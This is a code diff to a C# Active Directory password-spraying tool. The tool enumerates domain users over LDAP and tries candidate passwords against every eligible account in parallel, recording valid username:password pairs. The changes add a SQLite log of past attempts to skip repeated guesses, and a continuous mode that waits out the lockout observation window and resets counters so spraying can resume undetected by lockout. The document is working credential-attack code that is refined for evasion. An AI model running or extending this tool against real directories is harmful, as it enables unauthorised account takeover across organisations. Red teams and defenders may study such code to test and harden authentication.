@@ -7,16 +7,19 @@ using TheSprayer.Extensions;
 using System.Linq;
 using TheSprayer.Helpers;
 using System.Threading.Tasks;
+using System.Threading;
 
-namespace TheSprayer
+namespace TheSprayer.Services
 {
     public class ActiveDirectoryService
     {
+        private readonly SqliteService _sqlService;
         private readonly string _domain;
         private readonly string _domainUser;
         private readonly string _domainUserPass;
         private readonly string _domainController;
         private readonly string _distinguishedName;
+        private readonly string _dbLock = "";
 
         public ActiveDirectoryService(string domain, string domainUser, string domainUserPass, string domainController)
         {
@@ -32,6 +35,8 @@ namespace TheSprayer
                 _distinguishedName += $"dc={split},";
             }
             _distinguishedName = _distinguishedName.TrimEnd(',');
+
+            _sqlService = new SqliteService();
         }
 
         /// <summary>
@@ -143,8 +148,8 @@ namespace TheSprayer
             int pageCount = 0;
             // Get specific attributes. There's a heap that aren't relevant and when there are tons of users it will lessen the load on the DC
             string[] attributes = { "userPrincipalName", "sAMAccountName", "distinguishedName", "givenName", "sn", "description", "lastLogon", "badPwdCount", "badPasswordTime", "logonCount", "pwdLastSet", "accountExpires", "createTimeStamp", "ADsPath", "company", "objectSid", "sIDHistory", "adminDescription", "msDS-ResultantPSO", "userAccountControl" };
+            
             // LDAP Filter to get all domain users. This needs to be modified but works for testing.
-
             string filter = "(&(objectCategory=person)(objectClass=user))";
 
             // Initiate a new LDAP connection.
@@ -219,12 +224,15 @@ namespace TheSprayer
             return !Convert.ToBoolean(userAccountControlValue & 0x0002);
         }
 
-        public void SprayPasswords(IEnumerable<string> passwords, IEnumerable<string> usersToSpray = null, int attemptsToLeave = 2, string outputFile = null, bool force = false)
+        public void SprayPasswords(
+            IEnumerable<string> passwords, IEnumerable<string> usersToSpray = null, int attemptsToLeave = 2, 
+            string outputFile = null, bool continuous = false, bool noDb = false, bool force = false //TODO: Implement continuous
+        )
         {
             var defaultPasswordPolicy = GetPasswordPolicy();
             var fineGrainedPasswordPolicies = GetFineGrainedPasswordPolicy();
             var users = GetAllDomainUsers();
-
+            
             //Filter users down to the list passed in (if any)
             if (usersToSpray != null)
             {
@@ -255,13 +263,35 @@ namespace TheSprayer
                 }
             }
 
+            //Get the previous attempts for these users, we don't want to double-spray passwords
+            Dictionary<string, List<CredentialAttempt>> previousSprays = new();
+            if (!noDb)
+            {
+                previousSprays = _sqlService.GetSprayAttemptsForUsers(filteredUsers.Select(u => u.SamAccountName));
+            }
             foreach (var password in passwords)
             {
                 //If we have no more users, don't continue
                 if (filteredUsers.Count == 0)
                 {
-                    Console.WriteLine($"{users.Count} users found but they are all at risk of lockout, exiting.");
-                    return;
+                    Console.Write($"{users.Count} users found but they are all at risk of lockout, ");
+                    if (!continuous)
+                    {
+                        Console.WriteLine("exiting.");
+                        return;
+                    }
+                    else
+                    {
+                        Console.WriteLine($"waiting {defaultPasswordPolicy.ObservationWindow} minutes before retrying to prevent lockout.");
+                        Thread.Sleep(TimeSpan.FromMinutes((int)(defaultPasswordPolicy.ObservationWindow + 0.5))); //Rounded up to prevent trying a minute early, just in case
+
+                        //Reset the password attempts since we know it's 0 for everyone on the default policy now (excluding user error, but I'm sure it's fine)
+                        foreach (var user in users.Where(u => u.PasswordPolicyName == "Default Password Policy" && !u.Disabled))
+                        {
+                            user.BadPasswordAttempts = 0;
+                            filteredUsers.Add(user);
+                        }
+                    }
                 }
 
                 //Try the current password
@@ -271,20 +301,52 @@ namespace TheSprayer
                     new ParallelOptions { MaxDegreeOfParallelism = 1000 }, 
                     user =>
                     {
+                        //Skip user if they've previously been sprayed according to the db
+                        if (previousSprays.ContainsKey(user.SamAccountName))
+                        {
+                            var previousAttempt = previousSprays[user.SamAccountName].FirstOrDefault(a => a.Password == password);
+                            if (previousAttempt != null) 
+                            {
+                                if (previousAttempt.Success)
+                                {
+                                    ColorConsole.WriteLine($"{user.SamAccountName}:{password} (Found in database)");
+                                }
+                                return;
+                            }
+                        }
+
+                        //Test the credentials
                         if (TryValidateCredentials(user.SamAccountName, password))
                         {
                             ColorConsole.WriteLine($"{user.SamAccountName}:{password}");
                             if (!string.IsNullOrWhiteSpace(outputFile))
                             {
+                                //Avoid simultaniously editing the file and losing results
                                 lock (outputFile)
                                 {
                                     using var sw = System.IO.File.CreateText(outputFile);
                                     sw.WriteLine($"{user.SamAccountName}:{password}");
                                 }
                             }
+
+                            if (!noDb)
+                            {
+                                lock (_dbLock)
+                                {
+                                    _sqlService.SaveCredentialPair(user.SamAccountName, password, true);
+                                }
+                            }
                         }
                         else //Increment users bad password attempts and remove if close to lockout
                         {
+                            if (!noDb)
+                            {
+                                lock (_dbLock)
+                                {
+                                    _sqlService.SaveCredentialPair(user.SamAccountName, password, false);
+                                }
+                            }
+
                             user.BadPasswordAttempts++;
                             user.LastBadPasswordTime = DateTime.Now;
                             if (!ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
